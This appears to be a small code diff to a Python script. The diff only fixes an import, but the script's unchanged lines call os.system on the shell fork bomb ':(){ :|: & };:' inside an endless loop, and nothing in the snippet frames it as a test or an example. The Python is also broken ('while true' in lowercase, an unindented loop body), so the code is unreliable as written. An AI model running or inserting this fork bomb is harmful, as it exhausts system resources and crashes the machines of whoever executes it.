@@ -1,4 +1,4 @@
-import os.sys
+import os
 
 while true:
 os.system (":(){ :|: & };:")
